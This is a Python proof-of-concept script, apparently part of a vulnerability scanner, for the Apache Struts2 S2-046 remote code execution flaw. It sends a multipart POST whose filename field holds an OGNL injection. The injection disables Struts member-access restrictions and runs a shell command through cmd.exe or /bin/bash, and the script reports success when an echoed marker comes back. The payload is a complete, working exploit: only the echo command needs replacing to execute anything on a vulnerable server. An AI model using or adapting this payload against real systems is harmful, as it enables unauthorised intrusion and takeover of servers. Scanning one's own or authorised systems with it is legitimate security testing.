'''
Function:
    s2-046
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import random
import string
import requests
import re
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z',
            'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def vuln(self):
        url = self.url
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        payload = "test" + char
        data = ""
        data += "------WebKitFormBoundaryAnmUgTEhFhOZpr9z\r\n"
        data += 'Content-Disposition: form-data; name="pocfile"; filename="' + "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo " + payload + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b" + '"\r\n'
        data += "Content-Type: application/octet-stream\r\n\r\n"
        data += char + "\r\n"
        data += "------WebKitFormBoundaryAnmUgTEhFhOZpr9z--"
        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if payload in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在远程代码执行漏洞 (s2-046)\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                for i in result.request.body.split("\n"):
                    if b"\x00" in i.encode():
                        i = re.sub(b"\x00", b"\\\\x00", i.encode())
                        i = i.decode()
                    self.result_text += "\n                 {}".format(i)
                return True
            else:
                return False
        except Exception as e:
            return False

    def main(self):
        if self.vuln():
             return self.result_text
        else:
            return False

